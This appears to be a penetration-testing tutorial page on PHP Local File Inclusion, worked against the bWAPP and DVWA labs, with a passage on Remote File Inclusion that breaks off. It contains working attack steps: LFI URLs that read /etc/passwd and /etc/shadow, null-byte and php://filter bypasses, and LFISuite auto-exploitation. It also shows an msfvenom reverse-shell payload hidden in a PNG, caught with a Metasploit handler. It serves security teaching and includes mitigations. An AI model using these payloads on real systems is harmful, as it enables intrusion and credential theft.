<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body {
  font-family: "Lato", sans-serif;
}

.sidenav {
  height: 100%;
  width: 230px;
  position: fixed;
  z-index: 1;
  top: 0;
  left: 0;
  background-color: #111;
  overflow-x: hidden;
  padding-top: 20px;
}

.main {
        height: 100%;
        width: 1020px;
        position: scroll;
        z-index: 1;
        top: 0;
        left: 0;
        background-color: #fff;
        overflow-x: scroll;
        overflow-y: scroll;
        padding-top: 0px;
    }
.sidenav a {
  padding: 6px 8px 6px 16px;
  text-decoration: none;
  font-size: 15px;
  color: white;
  display: block;
}

.sidenav a:hover {
  color: red;
}

.main {
  margin-left: 240px; /* Same as the width of the sidenav */
  font-size: 28px; /* Increased text to enable scrolling */
  padding: 0px 10px;
}

@media screen and (max-height: 450px) {
  .sidenav {padding-top: 15px;}
  .sidenav a {font-size: 18px;}
}
</style>
</head>
<body>
<div class="sidenav">
<a href="1.html">【🖳Port Forwarding & Tunnelling🛠️👨🏽‍💻】</a>
  <a href="2.html">【🖳Comprehensive Guide on HTML Smuggling🛠️👨🏽‍💻】</a>
  <a href="3.html">【🖳Credential Dumping: Domain Cache Credential🛠️👨🏽‍💻】</a>
  <a href="4.html">【🖳Comprehensive Guide on Password Spraying Attack🛠️👨🏽‍💻】</a>
 <a href="5.html">【🖳A Detailed Guide on Hydra Tool🛠️👨🏽‍💻】</a>
  <a href="6.html">【🖳A Detailed Guide on Medusa Tool🛠️👨🏽‍💻】</a>
  <a href="7.html">【🖳Comprehensive Guide on Local & Remote File Inclusion🛠️👨🏽‍💻】</a>
<a href="8.html">【🖳Netcat for Pentesting🛠️👨🏽‍💻】</a>
  <a href="9.html">【🖳Comprehensive Guide on Dirbuster & BurpSuite Spider Tools🛠️👨🏽‍💻】</a>
  <a href="10.html">【🖳Comprehensive Encoding Guide🛠️👨🏽‍💻】</a>
 <p align="center"><img src="https://i.ibb.co/yyQbWbC/net.png" height="90" width="200"></p> 
</div>
<div class="main">
<div class="markdown-heading" dir="auto">
<h3 class="heading-element" dir="auto" tabindex="-1"><p align="left">🖳Comprehensive Guide on Local & Remote File Inclusion🛠️</p></h3>
<p><em>Have you ever wondered about the URL of the web-applications, some of them might include files from the local or the remote servers as either &ldquo;<strong>page=</strong>&rdquo; or &ldquo;<strong>file=</strong>&rdquo;</em>.&nbsp;</p>
<div class="content post-excerpt entry-content clearfix">
<p>In this deep down online world, dynamic web-applications are the ones that can easily be breached by an attacker due to their loosely written server-side codes and misconfigured system files. now, we will learn about File Inclusion, which is considered as one of the most critical vulnerability that somewhere allows an attacker to manipulate the target&rsquo;s web server by including malicious files remotely or even access sensitive files present onto that server.</p>
<h3><strong>Contents</strong></h3>
<ul>
<li><strong>Introduction</strong></li>
<li><strong>PHP Functions</strong>
<ul>
<li>Include() function</li>
<li>Require() function</li>
<li>Require-once() function</li>
</ul>
</li>
<li><strong>Local File Inclusion</strong></li>
<li><strong>LFI Exploitation</strong>
<ul>
<li>Basic LFI Attack</li>
<li>Null byte Attack</li>
<li>Base64 Attack</li>
<li>Fuzzing Attack</li>
<li>LFI Suite</li>
<li>LFI over File UPload</li>
</ul>
</li>
<li>Mitigation</li>
</ul>
<h3><strong>Introduction</strong></h3>
<p>File Inclusion vulnerabilities are commonly found in poorly written PHP web-applications where the input parameters are not properly sanitized or validated. Therefore it becomes easy for an attacker to capture the passing HTTP Requests, manipulates the URL parameter that accepts a filename and include the malicious files in the web-server.</p>
<p>In order to understand the mechanism, let&rsquo;s take a look at this scenario.</p>
<p>Consider a web-application that accepts a parameter that says&nbsp;<strong>&ldquo;file=hackingarticles.php&rdquo;</strong>&nbsp;via its URL, the server further processes it and displays its content on the application&rsquo;s screen.</p>
<p><img src="https://1.bp.blogspot.com/-NUU-e676uXs/Xv9omz82qVI/AAAAAAAAlLo/vSy5yplUIvcRKlawwCjrxSGPXrPRHUPRwCLcBGAsYHQ/s1600/1.png" alt="" /></p>
<p>Now the attacker tries to manipulate the filename parameter and calls up a local file or even injects a malicious script or a payload calling it from his own website into that parameter, thus the web-server will process it and executes that particular file which might lead to the following attacks:</p>
<ul>
<li>Code execution on the Web server</li>
<li>Cross-Site Scripting Attacks (XSS)</li>
<li>Denial of service (DOS)</li>
<li>Data Manipulation Attacks</li>
<li>Sensitive Information Disclosure</li>
</ul>
<p><img src="https://1.bp.blogspot.com/-_uOSZDjbCPI/Xv9oqka9NsI/AAAAAAAAlLs/ezkBJGTWszgXPkchAtYMsrawC26n_8qRQCLcBGAsYHQ/s1600/2.png" alt="" /></p>
<p>The impact of this vulnerability is quite high and has therefore been reported under-</p>
<ol>
<li><strong>CWE-98: &ldquo;Improper Control of Filename for Include/Require Statement in PHP Program&rdquo;</strong></li>
<li><strong>CWE-20: &ldquo;Improper Input Validation&rdquo;</strong></li>
<li><strong>CWE-22: &ldquo;Improper Limitation of a Pathname to a Restricted Directory (&lsquo;Path Traversal&rsquo;)&rdquo;</strong></li>
<li><strong>CWE-23: &ldquo;Relative Path Traversal&rdquo;</strong></li>
<li><strong>CWE-200: &ldquo;Exposure of Sensitive Information to an Unauthorized Actor&rdquo;</strong></li>
</ol>
<p>The File Inclusion attacks are of two types:</p>
<ol>
<li><strong>Local File Inclusion (LFI)</strong></li>
<li><strong>Remote File Inclusion (RFI)</strong></li>
</ol>
<p>Before we get into the depth of these file inclusion attacks, let&rsquo;s have a look at some of the PHP functions.</p>
<h3><strong>PHP Include() Function</strong></h3>
<p>We can insert the content of one PHP file into another PHP file before the server executes it, with the include() function. The function can be used to create functions, headers, footers or element that will be reused on multiple pages.</p>
<p>This will help the developers to make it easy to change the layout of a complete website with minimal effort i.e. if there is any change required then instead of changing thousands of files just change the included PHP file.</p>
<p><strong>Example 1</strong></p>
<p>Assume we have a standard footer file called &ldquo;<strong>footer.php</strong>&ldquo;, that looks like this</p>
<pre class="lang:default decode:true">&lt;?php
echo "&lt;p&gt;Copyright &amp;copy; 2010-" . date("Y") ."hackingartices.in&lt;/p&gt;";
?&gt;</pre>
<p>To include the footer file on our page, we&rsquo;ll be using the include statement.</p>
<pre class="lang:default decode:true">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to Hacking Articles&lt;/h1&gt;
&lt;p&gt;Some text.&lt;/p&gt;
&lt;p&gt;Some more text.&lt;/p&gt;
&lt;?php include 'footer.php';?&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
<p>The code within the included file (footer.php) is interpreted just as if it had been inserted into the main page.</p>
<p><strong>Example 2</strong></p>
<p>Assume we have a file called &ldquo;<strong>vars.php</strong>&ldquo;, with some variables defined:</p>
<pre class="lang:default decode:true">?php
$color='red';
$car='BMW';
?&gt;</pre>
<p><strong>Test.php</strong></p>
<pre class="lang:default decode:true">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to my Home Page!!&lt;/h1&gt;
&lt;?php
echo "A$color$car";&nbsp; //Output A
include 'var.php';
echo "A$color$car";&nbsp; //A red BMW
?&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
<p>As soon as the fifth line executes in the test.php file, just &ldquo;A&rdquo; will be printed out because we haven&rsquo;t called our var.php script yet. Whereas in the next line, we have used the include function to include the var.php file, as soon as the interpreter reads this line it directly calls our file from the server and executes it.</p>
<p>Therefore the variables &ldquo;colour&rdquo; and &ldquo;car&rdquo; are now assigned with &ldquo;red&rdquo; and &ldquo;BMW&rdquo;. As the last line runs, we&rsquo;ll get the output as &ldquo;A red BMW&rdquo;.</p>
<h3><strong>PHP Require() Function</strong></h3>
<p>Similar to the include() function, the&nbsp;<strong>require</strong>&nbsp;statement is also used to include a file into the PHP code. However, there is a one big difference between include and require functions. When a file is included with the&nbsp;<strong>include</strong>&nbsp;statement and PHP cannot find it or load it properly, thus the include() function generates a warning but the script will continue to execute:</p>
<p><strong>Example 3</strong></p>
<pre class="lang:default decode:true">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to my home page!&lt;/h1&gt;
&lt;?php&nbsp;include&nbsp;'noFileExists.php';
echo&nbsp;"I have a $color $car.";
?&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
<p><strong>Output: I have a Red BMW</strong></p>
<p>Now if we try to run the same code using the&nbsp;<strong>require</strong>&nbsp;function, the echo statement will not be executed because the script execution dies as soon as the require statement return a fatal error:</p>
<pre class="lang:default decode:true">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Welcome to my home page!&lt;/h1&gt;
&lt;?php&nbsp;require&nbsp;'noFileExists.php';
echo&nbsp;"I have a $color $car.";
?&gt;
&lt;/body&gt;
&lt;/html&gt;</pre>
<p>No output result.</p>
<h3><strong>PHP Require_once() Function</strong></h3>
<p><strong>We can use the Require_once() function&nbsp;</strong>to access the data of another page into our page but only once. It works in a similar way as the require() function do. The only difference between require and require_once is that, if it is found that the file has already been included in the page, then the calling script is going to ignore further inclusions.</p>
<p><strong>Example 4</strong></p>
<p><strong>echo.php</strong></p>
<pre class="lang:default decode:true ">&lt;?php
echo&nbsp;"Hello";
?&gt;</pre>
<p><strong>Test.php</strong></p>
<pre class="lang:default decode:true">&lt;?php
require('echo.php');
require_once('echo.php');
?&gt;</pre>
<p>Output: &ldquo;Hello&rdquo;</p>
<h3>Local File Inclusion (LFI)</h3>
<p>Local file inclusion is the vulnerability in which an attacker tries to trick the web-application by including the files that are already present locally into the server. It arises when a php file contains some php functions such as &ldquo;include&rdquo;, &ldquo;include_once&rdquo;, &ldquo;require&rdquo;, &ldquo;require_once&rdquo;.</p>
<p><img src="https://1.bp.blogspot.com/-c91vYqx1IHg/Xv9oxFgEiNI/AAAAAAAAlME/y2oeypIPl14XJ6r82Fgtgob3B_wERFaPQCLcBGAsYHQ/s1600/3.png" alt="" /></p>
<p>This vulnerability occurs, when a page receives, as input, the path to the file that has to be included and this input is not properly sanitized, allowing directory traversal characters (such as dot-dot-slash) to be injected. Thus, the local file inclusion has&nbsp;<strong>&ldquo;High Severity with a CVSS Score of 8.1&rdquo;</strong></p>
<p>Let&rsquo;s try to exploit this LFI vulnerability through all the different ways we can, I have used two different platforms&nbsp;<strong>bWAPP</strong>&nbsp;and&nbsp;<strong>DVWA</strong>&nbsp;which contains the file inclusion vulnerability.</p>
<h3>Basic Local file inclusion</h3>
<p>We&rsquo;ll open the target IP in our browser and login inside BWAPP as a&nbsp;<strong>bee : bug</strong>, further we will set the&nbsp;<strong>&ldquo;choose your bug&rdquo;</strong>&nbsp;option to&nbsp;<strong>Remote &amp; Local File Inclusion (RFI/LFI)&nbsp;</strong>and hit&nbsp;<strong>hack,&nbsp;</strong>even for this time we&rsquo;ll keep our security level to &ldquo;low&rdquo;.</p>
<p>Now, we&rsquo;ll be redirected to the web page which is basically suffering from RFI &amp; LFI Vulnerability. There we will find a comment section to select a language from the given drop-down list, as soon as we click on go button, the selected language file gets included into the URL.</p>
<p><img src="https://1.bp.blogspot.com/-3QfxxC2g2_k/Xv9o1MmdiWI/AAAAAAAAlMI/dyeyORxTpe0VaYUFmqSoTF3UBayuookDQCLcBGAsYHQ/s1600/4.png" alt="" /></p>
<p>In order to perform the basic LFI attack, we&rsquo;ll be manipulating the&nbsp;<strong>&ldquo;URL language parameter&rdquo;</strong>&nbsp;with&nbsp;<strong>&ldquo;/etc/passwd&rdquo;&nbsp;</strong>to access the password file present in the local system as:</p>
<p>192.168.0.11/bWAPP/rlfi.php?language=/etc/passwd</p>
<p><img src="https://1.bp.blogspot.com/-PiPbpbDoyc4/Xv9o5fnzO_I/AAAAAAAAlMQ/0ge9VPN_Vg0KQKiFr9mQ_LFzHMVCGvZbgCLcBGAsYHQ/s1600/5.png" alt="" /></p>
<p>So we&rsquo;ve successfully get into the password file and we are able to read this sensitive information directly from the webpage. Similarly we can even read the contents of the other files using&nbsp;<strong>&ldquo;/etc/shadow&rdquo;&nbsp;</strong>or&nbsp;<strong>&ldquo;/etc/group&rdquo;</strong></p>
<h3>Null byte</h3>
<p>In many scenarios, the basic local file inclusion attack might not work, due to the high-security configurations. From the below image you can observe that, I got failed to read the password file when executing the same path in the URL.</p>
<p><img src="https://1.bp.blogspot.com/-lS2fMp06hrg/Xv9qM-OzxRI/AAAAAAAAlNY/SgWFWZmNgE0YGaqn-H0ZYA2rvi8BKihqgCLcBGAsYHQ/s1600/6.png" alt="" /></p>
<p>So what should we do when we got stuck in some similar situations?</p>
<p>The answer is to go for the Null Byte Attack. Many developers add up a&nbsp;<strong>&lsquo;.php&rsquo;&nbsp;</strong>extension into their codes at the end of the required variable before it gets included.</p>
<p>Therefore the webserver is interpreting&nbsp;<strong>/etc/passwd</strong>&nbsp;as&nbsp;<strong>/etc/passwd.php</strong>, thus we are not able to access the file. In order to get rid of this .php we try to terminate the variable using the&nbsp;<strong>null byte character (%00)</strong>&nbsp;that will force the php server to ignore everything after that, as soon as it is interpreted.</p>
<pre class="lang:default decode:true">192.168.0.11/bWAPP/rlfi.php?language=/etc/passwd%00</pre>
<p><img src="https://1.bp.blogspot.com/-8qqOwUcMo68/Xv9qU_iqQtI/AAAAAAAAlNc/_MWoSWuGWLkxYyMTKMgzSgO_NhZsO_CSgCLcBGAsYHQ/s1600/7.png" alt="" /></p>
<p>Great, we are back!! We can read the contents of the password file again.</p>
<p>You can even grab the same using&nbsp;<strong>burpsuite,&nbsp;</strong>by simply capturing the browser&rsquo;s request in the proxy tab, manipulating its URL with&nbsp;<strong>/etc/passwd%00&nbsp;</strong>and forwarding it all to the repeater. Inside repeater, we can do a deep analysis of the sent requests and responses generated through it.</p>
<p>Now we just need to click on the&nbsp;<strong>go tab</strong>. And on the right side of the window, you can see that the password file is opened as a response.</p>
<p><img src="https://1.bp.blogspot.com/-32lZLOd2s10/Xv9qcIY32JI/AAAAAAAAlNk/aFCG_P-ZeEoK10e1Ur0KoAz9s2RSbdDdQCLcBGAsYHQ/s1600/8.png" alt="" /></p>
<h3>Base64 encoded</h3>
<p>Sometimes the security configuration is much high and we&rsquo;re unable to view the contents of the included PHP file. Thus we can still exploit the LFI vulnerability by just using the following PHP function.</p>
<pre class="lang:default decode:true">192.168.0.11/bWAPP/rlfi.php?language=php://filter/read=convert.base64-encode/resource=/etc/passwd</pre>
<p>Therefore from the below screenshot you can determine that the contents of the password file is encoded in base64. Copy the whole encoded text and try to decode it with any base64 decoder.</p>
<p><strong><img src="https://1.bp.blogspot.com/-EEv3YDTOW0Y/Xv9rPhoKQ8I/AAAAAAAAlN8/C52z-ubJAgsnL6BfIGNtb_RYZEWUsWH5QCLcBGAsYHQ/s1600/9.png" alt="" /></strong></p>
<p>I&rsquo;ve used the&nbsp;<strong>burpsuite decoder</strong>&nbsp;in order to decode the above-copied text.</p>
<p>Go to the&nbsp;<strong>Decoder</strong>&nbsp;option in burpsuite and paste the copied base64 text into the field provided, now on the right-hand side click on&nbsp;<strong>decode as</strong>&nbsp;and choose&nbsp;<strong>Base64</strong>&nbsp;from the options presented.</p>
<p><img src="https://1.bp.blogspot.com/-d4_0VysnBSo/Xv9rVqAdQjI/AAAAAAAAlOE/5hfVRDSaoF4ywnfpznwRTUuOMUdVbGHmQCLcBGAsYHQ/s1600/10.png" alt="" /></p>
<p>And here we go, you can see that we have successfully grabbed the password file again.</p>
<h3>Fuzzing</h3>
<p>Many times it is not possible to check for all these scenarios manually, and even sometimes our included file might not be there in the root directory. Thus in order to deface the website through the LFI vulnerability, we need to traverse back and find the actual path to that included file. This traversing can contain a lot of permutation and combinations, therefore we&rsquo;ll make a dictionary with all the possible conditions and will simply include it in our attack.</p>
<p>From the below screenshot, you can see that I&rsquo;ve send the intercepted request to the&nbsp;<strong>intruder</strong>&nbsp;with a simple right-click in the proxy tab and further selecting the&nbsp;<strong>send to intruder</strong>&nbsp;option<strong>.</strong></p>
<p><img src="https://1.bp.blogspot.com/-dzqZVsGXryU/Xv9rbJ2EyNI/AAAAAAAAlOI/bGDF4qLUZZoVwyd9HUUq6TFOBPOt29QwACLcBGAsYHQ/s1600/11.png" alt="" /></p>
<p>Now we need to load our dictionary file into the&nbsp;<strong>payload section</strong>&nbsp;and set the payload type to&nbsp;<strong>Simple list</strong>&nbsp;as highlighted in the below image.</p>
<p><img src="https://1.bp.blogspot.com/-CNxV0fMO8_s/Xv9rfLUK6tI/AAAAAAAAlOM/XP4_a99e_hc_VayIYa-IR9R-mCQmW_vZwCLcBGAsYHQ/s1600/12.png" alt="" /></p>
<p>So, we are almost done, we just need to set the payload position to our&nbsp;<strong>input value parameter&nbsp;</strong>and simply fire the &ldquo;<strong>Start Attack</strong>&rdquo; button to launch our fuzzing attack.</p>
<p><img src="https://1.bp.blogspot.com/-lxvpNjYjGlU/Xv9riwdlNMI/AAAAAAAAlOQ/UUT4eTOylJAq-CpAm3MID0ffuwDkvg8xgCLcBGAsYHQ/s1600/13.png" alt="" /></p>
<p>From the below image we can see that our attack has been started and there is a fluctuation in the length section. As soon as we find any increment in any of the supplied input condition, we&rsquo;ll check its response to reading the contents of the included file.</p>
<p><img src="https://1.bp.blogspot.com/-3Snr0p31qfo/Xv9rnISkDSI/AAAAAAAAlOY/Q-RhYWwJ-HwbghblhdbBiFmEA1M4nc_owCLcBGAsYHQ/s1600/14.png" alt="" /></p>
<p><img src="https://1.bp.blogspot.com/-OpmYUazksZw/Xv9ryH5_YII/AAAAAAAAlOk/fjGBUy21yZ4o23SLmTlVKALCvg0-TiZxgCLcBGAsYHQ/s1600/15.png" alt="" /></p>
<h3>LFI Suite</h3>
<p>Sometimes it becomes a bit frustrating while performing the LFI attack using Burp suite, i.e. wait for the incremented length and check for every possible response it shows. In order to make this task somewhat simpler and faster, we&rsquo;ll be using an amazing automated tool called&nbsp;<strong>LFI Suite</strong>. This helps us to scan the web site&rsquo;s URL and if found vulnerable, it displays all the possible results, therefore we can use it to gain the website&rsquo;s remote shell. You can download this from here.</p>
<p>Firstly we&rsquo;ll clone the LFI suite and boot it up in our kali machine using the following code:</p>
<pre class="lang:default decode:true">git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python lfisuite.py</pre>
<p><img src="https://1.bp.blogspot.com/-75mF_2HZ4YQ/Xv9r2Q25zVI/AAAAAAAAlOo/Dob0ZlMp0xY0YSChWW7xHVp8ebAttCqfgCLcBGAsYHQ/s1600/16.png" alt="" /></p>
<p>Choose the 2<sup>nd</sup>&nbsp;option as&nbsp;<strong>&ldquo;Scanner&rdquo;</strong>&nbsp;in order to check the possible input parameters.</p>
<p>Now it ask us to&nbsp;<strong>&ldquo;enter the cookies&rdquo;</strong>, I&rsquo;ve installed the &ldquo;<strong>HTTP Header live</strong>&rdquo; plugin to capture the HTTP passing requests.</p>
<p><img src="https://1.bp.blogspot.com/-Y7bOIFkOIhk/Xv9r76t5zBI/AAAAAAAAlOw/IL7Ck9kd9kM5Bvo0hi4CO5u2jLLsJok7gCLcBGAsYHQ/s1600/17.png" alt="" /></p>
<p>From the below image you can see that I&rsquo;ve copied the captured cookies into the cookies field and disable the Tor proxy. We just need to enter the website&rsquo;s URL and hit enter.</p>
<p><img src="https://1.bp.blogspot.com/-u66mmH5jWa4/Xv9r_k3n5-I/AAAAAAAAlO0/brHo11c6z6w7rstOisIEZHsRbHmKzKTZQCLcBGAsYHQ/s1600/18.png" alt="" /></p>
<p>Now the attack has been started and we can see that there are 40 different parameters through we can exploit the LFI vulnerability into our web-application.</p>
<p><img src="https://1.bp.blogspot.com/-2b2sJ4-SlOA/Xv9sDrGVWwI/AAAAAAAAlO8/QaAJvmtUkdsalAaFmB6aPsuLBfq87tJTQCLcBGAsYHQ/s1600/19.png" alt="" /></p>
<p>Now it&rsquo;s time to connect to the victim and deface the website by capturing its remote shell.</p>
<p>Restart the application and this time choose option&nbsp;<strong>1&nbsp;</strong>as &ldquo;<strong>Exploiter&rdquo;.&nbsp;</strong>Enter the required fields with the same&nbsp;<strong>cookies&nbsp;</strong>that we&rsquo;ve used in the scanner section and set the Tor proxy to&nbsp;<strong>&ldquo;No&rdquo;.</strong></p>
<p><img src="https://1.bp.blogspot.com/-wLncVxjYszc/Xv9sHAg2IRI/AAAAAAAAlPA/N9oSsB2CEI0AkH-94hRRsjsExc0otlwrwCLcBGAsYHQ/s1600/20.png" alt="" /></p>
<p>&nbsp;As soon as you hit enter, you&rsquo;ll find a list with multiple ways to attack the webserver.</p>
<p>Select the option&nbsp;<strong>9&nbsp;</strong>as&nbsp;<strong>&ldquo;Auto Hack&rdquo;.</strong></p>
<p>A new section will pop-up asking for the web site&rsquo;s URL, here enter the target website and hit&nbsp;<strong>enter.</strong></p>
<pre class="lang:default decode:true">http://192.168.0.11/bWAPP/rlfi.php?language=</pre>
<p><img src="https://1.bp.blogspot.com/-71EKVxWGgSs/Xv9sK2g5diI/AAAAAAAAlPE/fjx2ZXFlkB4SMu940h3mIsTKUQqloGrAgCLcBGAsYHQ/s1600/21.png" alt="" /></p>
<p>Cool!! We&rsquo;ve successfully captured the victim&rsquo;s command shell.</p>
<p><img src="https://1.bp.blogspot.com/-MTBxEjUyQBw/Xv9sQftyWvI/AAAAAAAAlPI/EYXkbZKNJ6gC25Ppv-8ktOxjtDx_eUuZQCLcBGAsYHQ/s1600/22.png" alt="" /></p>
<h3>LFI over File Upload</h3>
<p>As we all are aware with the File Upload vulnerability, that it allows an attacker to upload a file with the malicious code in it, which can be executed on the server.</p>
<p>But what, if the web-server is patched with the file upload vulnerability using&nbsp;<strong>high security?</strong></p>
<p>Not a big issue. We just need an unpatched file inclusion vulnerability into that, therefore we can bypass its high security through the&nbsp;<strong>file inclusion vulnerability</strong>&nbsp;and even get the reverse connection of victim&rsquo;s server.</p>
<p>Let&rsquo;s check it out how.</p>
<p>Firstly I&rsquo;ve downloaded an image&nbsp;<strong>raj.png&nbsp;</strong>and saved it on my desktop.</p>
<p>Now I&rsquo;ll open the terminal and type following command to generate a&nbsp;<strong>malicious PHP code inside &ldquo;raj.png&rdquo;</strong>&nbsp;image.</p>
<pre class="lang:default decode:true">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.9 lport=4444 &gt;&gt; /home/hackingarticles/Desktop/raj.png</pre>
<p><img src="https://1.bp.blogspot.com/-PJwQdQKrWCw/Xv9sVG9L6II/AAAAAAAAlPQ/JL9DVRgtacYhrdAM1Xu607JJsqEane8RgCLcBGAsYHQ/s1600/23.png" alt="" /></p>
<p>Let&rsquo;s verify whether our injected code is in the image or not.</p>
<pre class="lang:default decode:true">cat /home/hackingarticles/Desktop/raj.png</pre>
<p><img src="https://1.bp.blogspot.com/-cxsrLgKsARk/Xv9sZilMXVI/AAAAAAAAlPU/vl10NwZLHes88-880wUdKjmRHvmMSnkEgCLcBGAsYHQ/s1600/24.png" alt="" /></p>
<p>At the bottom, you will find that the image is having the PHP code in it. This means that our malicious image is ready, and we are now able to upload it over the web application.</p>
<p>Now explore the target&rsquo;s IP in browser and login into&nbsp;<strong>DVWA&nbsp;</strong>with&nbsp;<strong>security level high.</strong>&nbsp;Choose the vulnerability as a&nbsp;<strong>file upload</strong>&nbsp;in order to upload the malicious image into the web-applications server.</p>
<p>From the given screenshot, you can see &ldquo;r<strong>aj.png</strong>&rdquo; image is&nbsp;<strong>successfully uploaded</strong>.</p>
<p><strong>Copy&nbsp;</strong>the highlighted&nbsp;<strong>path</strong>&nbsp;where the image is uploaded.</p>
<p><img src="https://1.bp.blogspot.com/-e1ZAgXurhyY/Xv9sdTGYS3I/AAAAAAAAlPc/V0TLyU_Q33w47xiKSD7dOluUPs_FOs3GACLcBGAsYHQ/s1600/25.png" alt="" /></p>
<p>Before executing the image, we&rsquo;ll&nbsp;<strong>boot the Metasploit framework</strong>&nbsp;inside the Kali Linux and start-up&nbsp;<strong>multi/handler.</strong></p>
<pre class="lang:default decode:true">msf &gt; use multi/handler
msf exploit(handler) &gt; set payload php/meterpreter/reverse_tcp
msf exploit(handler) &gt; set lhost 192.168.0.9
msf exploit(handler) &gt; set lport 4444
msf exploit(handler) &gt; exploit</pre>
<p><img src="https://1.bp.blogspot.com/-bzayxQJcNZY/Xv9shGxjO4I/AAAAAAAAlPk/658cVIn_PoUreRqC_K2CYJr0ccK12DoRQCLcBGAsYHQ/s1600/26.png" alt="" /></p>
<p>Now we&rsquo;ll get back to DVWA and set&nbsp;<strong>security level low</strong>&nbsp;and will&nbsp;<strong>turn on the File Inclusion vulnerability</strong>. This time we will again manipulate the URL parameter&nbsp;<strong>&ldquo;page=&rdquo;</strong>&nbsp;by&nbsp;<strong>pasting&nbsp;</strong>the above-copied<strong>&nbsp;path</strong><strong>&nbsp;of uploaded image.</strong></p>
<pre class="lang:default decode:true">192.168.0.11/dvwa/vulnerabilities/fi/?page=../../hackable/uploads/raj.png</pre>
<p><img src="https://1.bp.blogspot.com/--g_daNT3YMY/Xv9sk5lmQmI/AAAAAAAAlPs/2tkQrC6ilG84auRkV7E_o_LbCcqDNGNBwCLcBGAsYHQ/s1600/27.png" alt="" /></p>
<p>As soon as the URL loads up into the browser, we will get the<strong>&nbsp;reverse connection</strong>&nbsp;of the server in our Kali machine.</p>
<p><img src="https://1.bp.blogspot.com/-J4SHUprjHsg/Xv9sohOiR7I/AAAAAAAAlPw/9kTT9ddO0UMiBZhFaRlZ0CyzPxEDAX-fgCLcBGAsYHQ/s1600/28.png" alt="" /></p>
<h3>Mitigations to File Inclusion Attacks</h3>
<ol>
<li>In order to prevent our website from the file inclusion attacks, we need to use the strong input validations i.e. rather allow any file to be included in our web-application we should restrict our input parameter to accept a whitelist of acceptable files and reject all the other inputs that do not strictly conform to specifications.</li>
</ol>
<p>We can examine this all with the following code snippet.</p>
<p><img src="https://1.bp.blogspot.com/-sIDWTAFn71A/Xv9s5HvelnI/AAAAAAAAlQE/7jKIm7_TSNIK_IPUIx22BVZnxFmpQ8ltgCLcBGAsYHQ/s1600/32.png" alt="" /></p>
<p>From the above image you can see that, there is an&nbsp;<strong>if condition,&nbsp;</strong>which is only allowing the whitelisted files and replaying all the other files with&nbsp;<strong>&ldquo;ERROR: File not Found!&rdquo;</strong></p>
<p><img src="https://1.bp.blogspot.com/-da5YrvuZHbM/Xv9s8gUGY-I/AAAAAAAAlQI/Dk8h5D-iHHsOJjEegPAzc_tJNrGCM6pZwCLcBGAsYHQ/s1600/33.png" alt="" /></p>
<ol start="2">
<li>Exclude the directory separators &ldquo;/&rdquo; to prevent our web-application from the directory traversal attack which may further lead to the Local File Inclusion attacks.</li>
<li>Develop or run the code in the most recent version of the PHP server which is available. And even configure the PHP applications so that it does not use register_globals.</li>
</ol>
</div>
<p><strong>Contents</strong></p>
<ul>
<li>Introduction to RFI</li>
<li>Why Remote file Inclusion Occurs?</li>
<li>Remote File Inclusion Exploitation
<ul>
<li>Basic Remote File Inclusion</li>
<li>Reverse Shell through Netcat</li>
<li>RFI over Metasploit</li>
<li>Bypass a Blacklist Implemented</li>
<li>Null Byte Attack</li>
<li>Exploitation through SMB Server</li>
</ul>
</li>
<li>Mitigation Steps</li>
</ul>
<h3><strong>Introduction</strong></h3>
<p><strong>Remote File inclusion&nbsp;</strong>is another variant to the&nbsp;<strong>File Inclusion vulnerability,</strong>&nbsp;which arises when the&nbsp;<strong>URI of a file</strong>&nbsp;is&nbsp;<strong>located</strong>&nbsp;<strong>on a different server</strong>&nbsp;and is&nbsp;<strong>passed to as a parameter</strong>&nbsp;to the PHP functions either &ldquo;include&rdquo;, &ldquo;include_once&rdquo;, &ldquo;require&rdquo;, or &ldquo;require_once&rdquo;.</p>
<p>The Remote File Inclusion vulnerabilities are easier to exploit but are less common say&nbsp;<strong>in 1 of the 10 web-applications.</strong>&nbsp;Here thus, instead of accessing a file on a local server, the attacker could simply inject his/her vulnerable PHP scripts which are&nbsp;<strong>hosted on his remote web-application</strong>&nbsp;<strong>into the unsanitized web application&rsquo;s URL</strong>, which thus might&nbsp; lead to disastrous results as:</p>
<ol>
<li>Allowing the attacker to execute remote commands on a web server as [RCE].</li>
<li>Provides complete access to the server.</li>
<li>Deface parts of the web, or even steal confidential information.</li>
<li>Implementation of Client-Side attacks as Cross-Site Scripting (XSS).</li>
</ol>
<p><img src="https://1.bp.blogspot.com/-0Ya1gW-ad2s/XyQP5CNlQmI/AAAAAAAAmcY/2GKJioWcXskl9Ip-VqzgDOqHuNcytpHdACLcBGAsYHQ/s1600/01.png" alt="" /></p>
<p><em>Therefore this Remote File Inclusion vulnerability has been reported as&nbsp;<strong>&ldquo;Critical &rdquo;</strong>&nbsp;and with the&nbsp;<strong>CVSS score</strong>&nbsp;of&nbsp;<strong>&ldquo;9.8&rdquo;</strong>&nbsp; under</em>:</p>
<ol>
<li><strong>CWE-98</strong>: Improper Control of Filename for Include/Require Statement in PHP Program.</li>
<li><strong>CWE-20:</strong><strong>&nbsp;Improper Input Validation</strong></li>
<li><strong>CWE-200:&nbsp;</strong><strong>Exposure of Sensitive Information to an Unauthorized Actor</strong></li>
</ol>
<h3><strong>Why Remote File Inclusion Occurs</strong></h3>
<p>Unlike Local File Inclusion, this remote file inclusion vulnerability also occurs due to the poorly written PHP server-side codes where the&nbsp;<strong>input parameters</strong>&nbsp;<strong>are not properly sanitized</strong>&nbsp;or&nbsp;<strong>validated.</strong></p>
<p>Look at the following code snippet, which thus lets the web-application to suffer from the RFI vulnerability as the developer is only dependable on the&nbsp;<strong>&ldquo;$file&rdquo;</strong>&nbsp;<strong>variable</strong>&nbsp;with the&nbsp;<strong>&ldquo;GET&rdquo;</strong>&nbsp;<strong>method</strong>&nbsp;and&nbsp;<strong>hadn&rsquo;t</strong>&nbsp;<strong>placed</strong>&nbsp;any&nbsp;<strong>input</strong>&nbsp;<strong>validation</strong>&nbsp;over it.</p>
